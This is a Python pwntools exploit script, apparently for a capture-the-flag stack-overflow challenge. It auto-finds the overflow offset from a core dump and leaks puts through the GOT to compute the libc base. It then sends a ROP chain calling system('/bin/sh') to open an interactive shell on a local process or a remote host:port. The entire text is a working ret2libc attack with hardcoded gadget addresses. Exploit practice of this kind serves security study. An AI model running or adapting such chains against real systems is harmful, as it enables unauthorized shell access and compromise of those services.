from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)
libc = ELF("./libc-2.27.so")

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def getAutoPayload():
	# Generate a cyclic pattern so that we can auto-find the offset
	payload = cyclic(256)

	# Run the process once so that it crashes
	autoproc = process(BINARY)
	autoproc.sendline(payload)
	autoproc.wait()

	# Get the core dump
	core = Coredump('./core')

	# Our cyclic pattern should have been used as the crashing address
	assert pack(core.fault_addr) in payload

	# Cool! Now let's just replace that value with the address needed
	payload = payload[:cyclic_find(pack(core.fault_addr))]
	return payload

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	print("REMOTE TIME")
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

# Cool!
splash()

# Generate auto payload
start_payload = getAutoPayload()

# Connect to local/remote process
sh = connect()

# Leak libc
print("1st pass...")
pop_rdi = 0x400683

payload = start_payload + p64(pop_rdi)
payload += p64(elf.got["puts"]) + p64(elf.plt["puts"])

payload += p64(elf.symbols["main"])

# Send 1st payload
sh.sendline(payload)

# Read libc
sh.recvline()

libc_base = int.from_bytes(sh.recvline()[:-1], byteorder='little') - libc.symbols["puts"]
print("LEAKED LIBC BASE: " + hex(libc_base))

libc.address = libc_base

# Pop shell
print("2nd pass...")

ret = 0x40048e
bin_sh = next(libc.search(b"/bin/sh\0"))
sys_addr = libc.symbols["system"]

# Ret for 16 bit alignment
payload = start_payload + p64(ret)

# system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(bin_sh) + p64(sys_addr)

sh.sendline(payload)

# Open shell
sh.interactive()
